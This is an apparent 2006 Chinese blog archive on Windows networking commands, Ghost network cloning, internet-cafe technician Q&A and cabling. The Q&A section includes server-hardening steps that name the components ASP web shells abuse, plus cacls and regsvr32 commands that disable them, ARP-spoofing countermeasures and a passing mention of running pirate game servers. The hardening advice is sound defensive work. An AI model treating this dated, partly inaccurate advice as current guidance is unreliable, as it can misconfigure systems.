　　·ipconfig /all 

当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。 

　　·ipconfig /release和ipconfig /renew 

　　这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。下面的范例是 ipconfig /all 命令输出，该计算机配置成使用 DHCP 服务器动态配置 TCP/IP，并使用 WINS 和 DNS 服务器解析名称。 

　　Windows 2000 IP Configuration 
　　Node Type.. . . . . . . . : Hybrid 
　　IP Routing Enabled.. . . . : No 
　　WINS Proxy Enabled.. . . . : No 
　　Ethernet adapter Local Area Connection: 
　　Host Name.. . . . . . . . : corp1.microsoft.com 
　　DNS Servers . . . . . . . : 10.1.0.200 
　　Description. . . . . . . : 3Com 3C90x Ethernet Adapter 
　　Physical Address. . . . . : 00-60-08-3E-46-07 
　　DHCP Enabled.. . . . . . . : Yes 
　　Autoconfiguration Enabled.: Yes 
　　IP Address. . . . . . . . . : 192.168.0.112 
　　Subnet Mask. . . . . . . . : 255.255.0.0 
　　Default Gateway. . . . . . : 192.168.0.1 
　　DHCP Server. . . . . . . . : 10.1.0.50 
　　Primary WINS Server. . . . : 10.1.0.101 
　　Secondary WINS Server. . . : 10.1.0.102 
　　Lease Obtained.. . . . . . : Wednesday, September 02, 1998 10:32:13 AM 
　　Lease Expires.. . . . . . : Friday, September 18, 1998 10:32:13 AM 　 

　　如果我们使用的是Windows 95/98，那么我们应该更习惯使用winipcfg而不是ipconfig，因为它是一个图形用户界面，而且所显示的信息与ipconfig相同，并且也提供发布和更新动态IP地址的选项。 
四、ARP（地址转换协议）的使用技巧 

　　ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。 

　　按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。 

　　ARP常用命令选项： 

　　·arp -a或arp Cg 

　　用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。 

　　·arp -a IP 

　　如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。 

　　·arp -s IP 物理地址 

　　我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。 

　　·arp -d IP 

　　使用本命令能够人工删除一个静态项目。 

　　例如我们在命令提示符下，键入 Arp Ca；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项： 

　　Interface:10.0.0.1 on interface 0x1 
　　Internet Address　　　Physical Address　　　Type 
　　10.0.0.99　　　　　　 00-e0-98-00-7c-dc　　 dynamic 
在此例中，缓存项指出位于 10.0.0.99 的远程主机解析成 00-e0-98-00-7c-dc 的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。 

　　五、Tracert、Route 与BTStat的使用技巧 

　　1、Tracert的使用技巧　　 

　　如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标 IP 地址的路径并记录结果。tracert 命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert 命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。 

　 Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。 

　　tracert 最常见的用法： 

　　tracert IP address [-d] 该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。 

　　Tracert一般用来检测故障的位置，我们可以用tracert IP在哪个环节上出了问题，虽然还是没有确定是什么问题，但它已经告诉了我们问题所在的地方，我们也就可以很有把握的告诉别人----某某地方出了问题。 

　　2、Route 的使用技巧 

　　大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。 

　　在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。 

一般使用选项： 

　　·route print 

　　本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。 

　　·route add 

　　使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络209.98.32.33的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为202.96.123.5，子网掩码为255.255.255.224，那么我们应该输入以下命令： 

　　route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5 
　　·route change 

　　我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径： 

　　route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3 
　　·route delete 

　　使用本命令可以从路由表中删除路由。例如：route delete 209.98.32.33 

　　3、NBTStat的使用技巧 

　　使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。 

　　常用选项： 
　　·nbtstat Cn 
　　显示寄存在本地的名字和服务程序。 
　　·nbtstat Cc 
　　本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于寸放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。 
　　·nbtstat Cr 
　　本命令用于清除和重新加载NetBIOS名字高速缓存。 
　　·nbtstat -a IP 
　　通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。 
　　·nbtstat -s IP 

　　显示实用其IP地址的另一台计算机的NetBIOS连接表。例如我们在命令提示符下，键入：nbtstat CRR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。 


losevangel 发表于 >2006-10-5 2:18:46  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网络机房中Ghost 8.0的奇妙应用 

我们单位新建一个网络机房有60台TCL计算机，用Ghost 8.0企业版2小时全部装机完毕，效果非常好。现把方法介绍给你，不妨试一试。  

准备工作  

安装服务器，其操作系统为Windows 2000 server或Windows 2003，并配置好DHCP；选一台客户机安装好操作系统和相应的软件；用Usboot1.66软件做好U盘启动盘。  

Ghost8.0 企业版安装  

在服务器上安装Ghost8.0企业版，其实安装很简单，一路“下一步”，注意：在安装模式时，要选择第一项，就是“控制台”， 在安装组件时，一般不需要改动，用默认的就可以了。  

制作客户的启动盘  

在服务器上点击“开始→程序→Symantec Ghost Ghost Boot Wizard→Network Boot Disk”。  

点击“下一步”出现了网卡选择提示框。根据自己的网卡可以从中选择自己的网卡型号，由于在8.0版本里面常用都有 (8139的网卡驱动也有)选中后点击“下一步”出现选择DOS版本一是PC-DOS二是MS-DOS若选择MS-DOS则需要在Windwos98中做一张启动盘插入软驱点击“下一步”选择客户端的类型，采用默认的连续两次“下一步”出现客户端的网络设置，注意用DHCP服务器自动分配IP地址的办法，接下来可以选择启动盘在哪个软驱里做，以及做几张等等信息。一切都设置好以后，就可以开始制作启动盘了。  

开始网络复制  

1. 在服务器中启动Ghost 8.0的GhostCast Server，在“Session Name”处随便添一个名称，越简单越好，但是要记清楚，因为在客户端里要填入和这个一样的名称。后面有两个选项，第一个是“Restore Image”，意思是将镜像包加载到客户机上。第二个是“Create Image”，意思是建立镜像包。我们这里选择第二个。点击“Browse”按钮，为镜像包选择一个位置，起名并保存好。这是客户端系统的ghost镜像包。然后点击右侧的“Accept Clients”。开始接受客户端的请求（如图）。  

2. 在客户端计算机中修改COMS设置，选USB-HDD启动，用我们刚才做好的启动盘（U盘）启动电脑。正常情况下，开机应该自动进入Ghost，看到“Multicasting”选项已经有效，选择它，回车，在这里可以看到，客户端的Ip已经自动分配过来了，接着需要填写的就是服务器端的名称，在这里是“Server”。点击“OK”，在选择“No”，或者“Fast”。确认后开始上传镜像。  

3. 上传完毕后在服务器端选择“Restore Image”，并选择刚才做好的镜像包。然后点击“Accept Clients”等待客户端的请求，这时，就用U盘启动客户端。具体步骤和上面制作镜像包的步骤类似，首先是是启动，启动后进入Ghost，选择“Multicasting”，填入服务器端名称（Server），但是在填入服务器端名称之后，与上面的过程有所不同，客户端开始和服务器端联系，以获取当前Ghost包的详细信息，接着按照提示操作，全部客户端准备就绪后，在服务器端点击“Send”按钮，网络Ghost就真正开始了，大约于二十分钟，Ghost过程结束。依次重启每个客户端，更改计算机名和IP地址等信息。这样在两小时左右一个网络机房装备完毕 



losevangel 发表于 >2006-10-5 1:50:22  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网吧技术员资料问答 


网吧技术员资料问答
以下内容通用于网吧，网吧技术能在下面的问题启发充电，其实网吧就是这个样。凡事不要钻牛角尖，何不用最快的方式去解决问题，面对的问题不是一个，也不是两个，学到的是自已的，花的是在网吧，能多一点就算一点，电脑世界学海永无止境。本人技术有限，希望更多朋友发表以下未完成的答案及建设方案，作为大家抛砖引玉，投石问路。

一、电脑频繁自动重启,你会用什么步骤去查明原因解决?
*多数于电源按钮，内存不正常问题。

二.怎么样删除winxp/2000/2003的默认共享
（1）用记事本写上以下内容保存为bat批处理文件运行，但重启又会恢复，除非加入启动项里。 
@echo off
net share c＄ /del
net share d＄ /del
cls
net share e＄ /del
net share ipc＄ /del
cls
net share f＄ /del
net share g＄ /del
cls
net share h＄ /del
net share admin＄ /del
cls

（2）修改注册表永久删除共享：
在运行对话框中输入“regedit”并回车，打开注册表编辑器，在左侧面板中 
定位到“ 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\ 
Parameters”,在该位置下新建一个名为“AutoShareWks”的DWORD值，并将 
其数值设置为“0”重启系统后所有的默认共享都将被自动删除，并且不会 
继续创建。

（3）Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]
"AutoShareServer"=dword:00000000
"AutoSharewks"=dword:00000000
将以上所有英文复制保存为reg文件直接导入重启生效，永久删除默认共享。

三.局域网中怎么使两台电脑能够免密码互相映射访问?
*在没作任何策略设置情况下，开启guest用户，相同的用户名和密码，就可以直接映射。如果可以映射但无法打开,原因是ntfs 中属性的安全权限必须加上everyone用户.

四.你对win2000以上系统的DOS工具认识有多少种及是否懂得使用?
* 目前DOS工具种类很多，maxdos工作室出品的DOS相对网吧来说比较适用，集成多种DOS下常用工具。
介绍：maxdos系列，eky ghost系列。 矮人工作室DOS 。任 逍遥DOS，等其他。

五.你会用什么工具什么方法怎么对局域网进行网络克隆?
*若说网络克隆maxdos5.5s挺不错，集成了20多种通用网卡驱动，即使生手也能简易操作。
*如果原先工作站没有安装网络克隆DOS工具，可以利用U盘版或软驱A盘装载克隆引导程序进行网克

六.会使用多少种PC系统?各种主要用途及性能。 
PC系统有很多种，有兴趣对各种系统进行研究的话可以利用虚拟机进行测试。利用虚拟光驱和虚拟机（比如VM）就可以达到你的目的。 
*操作系统介绍地址：http://tech.sina.com.cn/c/2002-01-10/8366.html 

七.是否熟悉构架WEB,网吧主页投票公告及FTP?熟悉程度如何?
前言：网吧构架web目的是制作网吧的主页，和电影点播。主页有利于用于公告及投票及上网顾客的网址导航。
*安装IIS（至少支持ASP）---下载免费全站程序，对网站进行修改，形成主页。win2003安装IIS的方法，打开“添加或删除程序”下一步选“添加或删除windows组件”，都看到了需安装的组件吧，根据需要选择安装就ok了。打勾为安装，没打勾为删除。
*FTP跟安装IIS一样简单，不推荐win系统自带FTP功能。目前较流行是server_U ftp 6.0或以后更高版本。设置比较容易。安装方法“
安装后--新建用户名--用户名的目录---设置用户目录的访问权限。
IIS默认端口80 FTP默认是21 如需互联网访问，只需在路由中设置转发规则。即在路由中将外网访问的80指向你的服务器IP。


八.300台电脑的网吧,你会用怎么样的方案去管理网吧,比如客机与服务器的配合使用更新.
个人观点：
服务器与工作站的配合使用，同时也确保服务器关闭后不影响工作站。工作站桌面背景，桌面快捷方式，所有启动项。都可以在服务器中集中管理，甚至经过优化的系统服务，都可以利用服务器调用批处理或VBS启用运行。至于克隆恢复系统，当然用网克了，怎么网克？用maxdos吧我网吧没有用任何特殊程序，可是上面这些我都做到了。

九.对无盘熟悉程度如何?认识并且熟悉操作哪种?
十.客户机桌面如何分布快捷方式,菜单程序管理?快捷方式文件夹管理?
个人观点：别在桌面上放不多不少图标。最好用菜单管理。

十一.电影收看方式:vod点播?菜单程序?直接共享?IIS或媒流处理?
电影收看方式在网吧中种类比较多，大致上以下几种：
1，直接共享， （观点：直接暴露了点）
2，菜单浏览共享 （观点：最适合懒人网管们了）
3，VOD程序，如万象VOD美萍VOD （观点：VOD是网页式，加入电影也很方便，支持多种协议，但程序出问题后就不能看了，另外网页播放器支持格式不够多，除非你的电影全是普通的rm.rmvb.wmv格）
4，WEB网页，如ASP，php（利用电影全站程序，专业一点的话可以用real流媒体处理协议播放，使用http和rstp的分别是rstp在网页中
播放快进可以继续加载缓冲，而用http快进效果就差了，通常卡住不动，如果用直接播放器播放电影无类是什么协议情况都很好，观点：华实美观，相似VOD共同缺点，同时加入电影比较麻烦，不像VOD拖动就能完成。）
5，专业流媒体服器一般MMS协议和rstp两种，http则是直接IIS中的默认协议网络播放，

十二.超出255台电脑的局域网,如何分配IP使其互相访问?
总结一句话：只需修改路由的掩码。
1.路由使用255.255.0.0
当然工作站可以设成255.255.0.0（或248或254）
IP:192.168.0.1-192.168.255.254
所有的客户机掩码都要设为255.255.0.0
2.只有300或400台的话建议路由用255.255.254.0掩码，加快局域网寻址速度。


十三.怎样利用双网卡分配双IP和单网卡分配双IP并同时可以使用?
1.一台机两个网卡分配两个IP（可以）。
2.两个网卡不能分配同样IP，（不可以），除非禁用一个。
3.一个网卡分配多个ip，（可以）打开tpc/IP设置属性---高级--IP设置就可以看到加多个IP了和掩码了。

十四.怎么防护应急内网攻击?及应急蠕虫病毒?
*网警软件，或专业查看内网攻击的软件（查看各IP网卡是不处于混合型模式），
*防火墙查看接受异常数据包的IP
*通过路由查看内网各IP的运行状态，可查看异常流量。
*在c盘system32目录下建个名为packet.dll的目录，设为“只读”，拒绝所有用户权限。
*未发生ARP风波前防护ARP办法，先在服务器安装Anti ARP Sniffer 并运行，如果局域网有ARP欺骗即时报警并说明攻击来源。
*用“arp -a > c:\IP-Mac.txt”生成本网吧IP－MAC地址对照表 ，
*用批处理绑定网关的IP地址MAC地址
Arp -s 网关IP地址 网关的MAC地址
*已发生ARP应急方法：去下载一个nbtscan 专门扫描ARP真实mac的工具。DOS命令：ARP -a 看到可能是假的mac 但nbtscan扫描的是真实mac，对比一下mac就知哪个是真哪个是假了。


十五.怎么样对2000/2003/xp进行优化成为网吧工作站?
*去除没必要的启动项
*支除没必要的“服务”项，如远程桌面，打印，windows更新等，
*修改注册表和BOOT文件加速开关机，
优化资料可以网上找到成堆。
十六.构架各种私服熟悉程度如何?
比如传奇，CS，魔兽世界比较热门私服。

十七.认识多少种游戏更新方式?菜单程序?映像程序?同步对比?
在网吧中游戏更新方式大致上有几个
*同步对比共享更新。（同步对比更新目前上两种，一种是手动，一种是自动。比如网吧同步专家是手动更新，伙狐自动更新）
*菜单更新。工作原理，当客机打开菜单，客户机首先将配置文件从服务器拷贝过来，并打开菜单目录，客户点击游戏时，程序先与服务器游戏目录对比更新再运行。比如迅闪3。1游戏更新
*使用映像盘。工作原理，将服务器的硬盘用虚拟软件映射至客机，客机生成多出一个游戏盘。映像盘不受限制，无论怎么更改重启后即还原。目录流行有：（易游，网众，锐起，scis 万象虚拟 addol游戏管理系统）

十八.熟悉多少种网吧收银系统?对哪种最熟悉?(IC卡 万象软/硬版,美平,......)
*IC卡
*万象软件版和硬件版（在南方地区比较通用）
*pubwin 网吧收费系统。（在北方较通用）
*其他则看当地指定收费系统

十九.会使多少种工具或修改方式对网吧客户机进行某些限制功能?
*网吧计费端自带权限限制功能
*网吧辅助工具，隐藏某些特殊文件程序，
*修改注册表。（不建议，一般工具可以解决又何必）
*组策略启用限制（效果很好，便利用工具也是可以恢复的，组策略限制大多会拖廷开机速度，很慢那种。）

二十.是否熟悉技术员及收银员交接班方案?
正规而有一定规模级网吧值得深思的问题。不应当作小问题来对待。

二一.认识多少种路由(软路\硬路)使用?熟悉程度如何?
软路：RouterOS ipcop、coyote Linux、LRP、smoothwall 各有千秋。
硬路：推荐华为，锐捷，思科。功能上可能不多，本人用过实在很稳定。

二二.分别自拟40G/80G/120G客户机装机方案?
二三.对各种还原精灵使用方式了解及注意项目.
*还原精灵种类很多，如“冰点”，“远志还原精灵”的单机版和网络版，国内甚为通用，然面树大招风，
通用的软件往往针对破解的软件就多，目前这两种已有破解软件针对了。
*经本人多次试验，intel865似乎安装国产还原精灵后无法开机，则冰点就可以。
*注意：一般情况下，进行ghost之前母盘应去除还原精灵在进行克隆，否则会有异常不能正常开机，安装了冰点的客户机可以用没有安装还原精灵的母盘进行ghost.ghost最好用8。0以上的版本，可以去除系统中的多余文件，比如**.sys虚拟内存

二四.详述新机硬盘无任何资料,手动分区及安装系统全过程.
1，利用含有分区工具光盘引导进去，BIOS设置CDrom启动，进入光盘引导DM或pq，diskgen，都可以进行自定义分区格式化。接着放入windows安装盘按提示安装即可。

二五.对各种软件程序熟悉程度？
dos分区和磁盘修复工具，office SQL IIS FTP 网页编辑软件。
杀毒软件 防火墙 播放器 制图软件 电子相关软件，我想有时间的话所有软件都值得一试。

ghost的应用技巧
CMOS优化
磁盘阵列简述 
修改BIOS开机画面 
系统克隆后无法进入系统解决方法。 
怎样清除忘记的 CMOS 口令? 
局域网一般有几种传输介质，怎么分类?
批处理或DOS的应用
忘记用户密码的解决方法
禁止格式化，防删除，防目标另存或隐藏
*进程管理小程序，当客机打开某些设定不允许访问和打开的窗口，自动关闭。
*修改系统中的shell32.dll及其他系统文件。利用EXESCOPE工具。细节请在网上寻资料。 
等等....
-------http://www.zhaoni.cn/f/list_1412_2_tl.html--------------古佰的天空--------- 
问：我使用的是Windows 2000 Server系统 ，每次启动都报错，提示在系统启动时至少有一个服务或驱动程序产生错误。查看系统日志显示“由于下列错误，Cdralw2k 服务启动失败：无法启动服务，原因可能是它被禁用或与它相关联的设备没有启动”。请问我该怎么办？


答：删除或重命名C:\Winnt\System32\Drivers文件夹的两个文件：

Cdralw2k.sys

Cdr4_2k.sys
----------------------------------------------------
server2003/xp/2000 每次弹出服务控制管理器“系统启动时至少有一个服务或驱动程序产生错误”解决方法。把以下注册表用记事本编辑，保存为**.reg ,直接点击导入即可。
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]
"NoPopUpsOnBoot"=dword:00000001
如果导入失败，请进程手动操作。找到[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]
右键新建dword值，命名为NoPopUpsOnBoot，设其值为“1”
OK，
----------------------------------------------------------DCOM 遇到错误“锁定服务数据库。 ”,试图以参数“”启动服务 netman 以运行服务器: 
DCOM 遇到错误“锁定服务数据库。 ”，试图以参数“”启动服务 netman 以运行服务器: 
{BA126AD1-2166-11D1-B1D0-00805FC1270E} 
如上的系统错误怎么解决方法如下：根据系统的提示操作，试图使用组件服务管理工具修改此安全权限是无法奏效的。有效方法是在注册表中修改相关键值，运行注册后，定位于“HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}”，再查看右侧视图，记住“AppID”对应数值数据“{27AF75ED-20D9-11D1-B1CE-00805FC1270E}” 
此后，打开“组件服务”，依次选择“组件服务”→“计算机”→“我的电脑”→“DCOM配置”，点击菜单栏“查看”→“详细信息”，再在右侧视图中找到ID为“{27AF75ED-20D9-11D1-B1CE-00805FC1270E}”的应用程序“netman”，用鼠标右键单击，选择“属性”，在弹出窗口中切换到“安全”标签页，在“启动和激活权限”项目中点击“编辑”按钮，然后在弹出的“启动权限”对话框中添加“NETWORK SERVICE”用户，设置其权限为允许本地启动和激活。确认操作后，系统就不会再显示DCOM出错了 
--网吧游戏电影服务器安全相关-------------------------
1.修改默认空密码用户
2.禁用Telnet
3.删除默认共享.
4.禁用VBS脚本和BAT.防止病毒运行
5.禁用的所有远程相关的服务,如注册表服务,远程桌面控制(3389)服务等.
6.装有IIS的话请禁用FSO(FileSystemObject)防止挂马上传.

　　基于FileSystemObject组件的asp木马 

　　cacls %systemroot%\system32\scrrun.dll /e /d guests //禁止guests使用 

　　regsvr32 scrrun.dll /u /s //删除 

　　基于shell.application组件的asp木马 

　　cacls %systemroot%\system32\shell32.dll /e /d guests //禁止guests使用 

　　regsvr32 shell32.dll /u /s //删除 
目前比较流行的ASP木马主要通过三种技术来进行对服务器的相关操作。　　　 

　　一、使用FileSystemObject组件　　　 

　　二、使用WScript.Shell组件 
　 
　　三、使用Shell.Application组件　　　 

　　目前比较流行的ASP木马主要通过三种技术来进行对服务器的相关操作。　　　 

　　一、使用FileSystemObject组件 
　 
　　FileSystemObject可以对文件进行常规操作　　　 

　　可以通过修改注册表，将此组件改名，来防止此类木马的危害。　　　 

　　HKEY_CLASSES_ROOTScripting.FileSystemObject 

　　改名为其它的名字，如：改为FileSystemObject_ChangeName　　　 

　　自己以后调用的时候使用这个就可以正常调用此组件了 
　 
　　也要将clsid值也改一下 

　　HKEY_CLASSES_ROOTScripting.FileSystemObjectCLSID项目的值　　　 

　　也可以将其删除，来防止此类木马的危害。　　　 

　　注销此组件命令：RegSrv32 /u C:WINNTSYSTEMscrrun.dll 　　　 

　　禁止Guest用户使用scrrun.dll来防止调用此组件。 

　　使用命令：cacls C:WINNTsystem32scrrun.dll /e /d guests　　　 

　　二、使用WScript.Shell组件　　　 

　　WScript.Shell可以调用系统内核运行DOS基本命令　　　 

　　可以通过修改注册表，将此组件改名，来防止此类木马的危害。　　　 

　　HKEY_CLASSES_ROOTWScript.Shell 

　　及 

　　HKEY_CLASSES_ROOTWScript.Shell.1 

　　改名为其它的名字，如：改为WScript.Shell_ChangeName或WScript.Shell.1_ChangeName　　　 

　　自己以后调用的时候使用这个就可以正常调用此组件了　　　　 

　　也要将clsid值也改一下 

　　HKEY_CLASSES_ROOTWScript.ShellCLSID项目的值 

　　HKEY_CLASSES_ROOTWScript.Shell.1CLSID项目的值 
　 
　　也可以将其删除，来防止此类木马的危害。 


losevangel 发表于 >2006-10-5 1:45:58  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网吧综合布线之电源和网络布线经验谈 

网吧目前所提供的服务，像网页浏览、网络游戏、在线电影、远程教育等最基本的服务都与网络有关，网络质量的好坏直接决定了网吧的生存能力。所以，如何规划一个优质的网络环境，是网吧经营者必须要考虑的一个要点，其中网吧的综合布线占了很大的因素，主要有两大部分：电源布线和网络布线。 
电源系统的布线 
网吧电源系统的布线，可以分为设计、施工、验收三个步骤，在这三个步骤中需要注意以下规则和事项。 
一、布线设计 
现在市电供应系统普遍采用三相四线制供电模式，建议仍在使用两相供电的网吧更换为三相四线制的供电模式。对于普通网吧来说，网吧的主要用电系统有： 
1、空调：对网吧来说，空调已经成为一种标准配置，一般使用柜式空调，而且功耗很大，每台功率一般在3500-4500W之间。因此，在设计电源布线系统时，必须给空调配备专用电源线路。 
2、电脑：一般在对网吧电源系统布线设计时，容易产生一个误区，认为电脑使用的电源线随便拉一条就行。其实，网吧内总负载最大的还是电脑，在不配备音箱的情况下，功率一般在150W左右，机器数量增多，功率就明显增大。因此，网吧电脑使用的电源线，不应该是逐一串联的模式，而是使用分组点接，具体做法如下： 
每隔1.5米左右接入一只10A三芯国标插座（即墙上嵌入的独立插座）作为一个点，再将上述多孔插座接入，在1.5米的范围内，将会有4－5台电脑使用这一个插座接入电源；然后，可视实际情况把电脑按10台或16台为一组，每组由一个空气开关控制，整个网吧可以分为4-6组或者更多的组。 
根据每条主干的负载，合理选择电源线的型号。一般来说，主干线路使用铜芯线，下面的分支线路可以使用铝芯线（笔者建议，最好网吧电源系统的所有线路全部采用GB的铜芯线）。同时，根据电源的负载合理选择不同规格的电源线。 
3、网络设备和照明设备：对于有专业机柜的网吧，建议对路由器等价值较高的网络设备加UPS后备电源，以保护网络设备的安全。 
二、具体施工 
1、电源布线应该与房间装修同步进行，为了网吧环境的美观，不宜将电源线布置在明处，可以放置在PVC管道或专用的电源线通道中。 
2、对于比较重要的主干线路，最好在布线施工时多布设一条线路做备份线路。同时，为避免影响网线和电话线的传输质量，电源线最好单独走一个管道或者PVC槽子。对于一些不易进行二次施工的管道，请务必布设备用线路。 
3、选择电源主干和分支线路的规格时，建议在目前负载功率的基础上，上浮50-80％的数值，以满足未来网吧机器升级时的供电需求。 
4、在布设电源线时，应该做上一些标记。每个空气开关控制哪条线路，都要做详细的记录。 
三、验收 
所有电源布线工作结束后，必须在所有的布线管道未封闭之前进行一系列的验收和检测。电源系统的检测，主要分以下几个方面： 
1、测试所有设备工作是否正常：网吧电源布线工作结束后，请测试所有的线路是否能够正常工作，空气开关工作是否正常。 
2、网吧全负载运行：运行第一步测试后，把网吧内的设备分批次打开，并逐步达到网吧的全负载功率运行。全负载运行的时间最好在24小时以上，这样才能检验电源布线系统的真正性能。在全负载运行过程中，如果出现空气开关自动跳闸或者保险丝被烧断，请务必仔细检查原因。 
3、网吧超负荷运行：经过全负载运行后，可以进行短时间的超负荷运行，以检测电源系统的质量和抗压性能。超负荷运行的时间可以在十个小时左右，根据实际情况进行测试。 
四、需要注意的几个问题 
网吧电源布线的整个过程中，必须高度重视一些小问题，一些微小失误就可能造成无法估计的损失。 
1、地线的安装：细心的技术人员会发现，在电脑的三相电源插头中，负责接地的那一芯，是没有电源线的，也就是缺乏有效的接地措施。但是，网吧内电脑和一些网络设备，在正常工作中外壳都可能产生一些静电，如果没有有效的接地措施，静电积累到一定程度，可能会烧坏硬件或者击伤人。因此，在网吧电源布线时，必须安装地线。 
2、避雷措施：在很多技术人员眼中，避雷似乎与网吧毫不相关，但是，如果网吧没有良好的避雷措施，遇到雷击时，可能会烧毁网吧内所有的设备。 
3、备份线路：对于网吧电源系统的主干线路或一些不方便检修的线路，一定要布设备份线路，如果主线路损坏，立即更换成备份线路。特别是对于正在营业中的网吧，布设备份线路是提高网吧自身竞争力的一大举措。 
4、高质量的配线间：对于百台以上的网吧，在设计电源系统时最好准备一个独立的空间安装空气开关、UPS及其它的网吧电源设备。 
5、在使用三相四线制供电系统的网吧，设计电源系统时，要保证三根火线的负载不要相差太大，差值以500W左右最佳。 
网吧电源系统的布线，最好找专业的电工技师或者专业的综合布线人员来做，并且要做好布线的档案记录工作，每一条电源线的负责范围、走向如何等都要记录在文档中，以方便日后维护。
 

文件复制命令COPY（内部命令）
格式：COPY[源盘符][源路径]<源文件名>[目标盘符][目标路径][目标文件名]

功能：将指定盘上的一个或多个文件复制到另一指定磁盘的指定目录下

说明：

源文件名和目标文件名均可使用通配符（*及?） 
指定目标文件名时为改名复制，省略目标文件名为同名拷贝，但同盘拷贝时目标文件不能与原文件同名 
不能拷贝隐含和系统属性的文件 
例1 将C盘上WPS子目录下的所有*.WPS文件复制到A盘

C:\>COPY C:\WPS\*.WPS A: 

例2 将当前A盘上的TEST1.TEX文件拷贝到C盘上，并改名为TEST2.TXT

C:\>COPY A:TEST1.TXT C:\TEST2.TXT 回答者： yueyunqingxi | 四级 | 2009-10-12 12:04 
           ftp
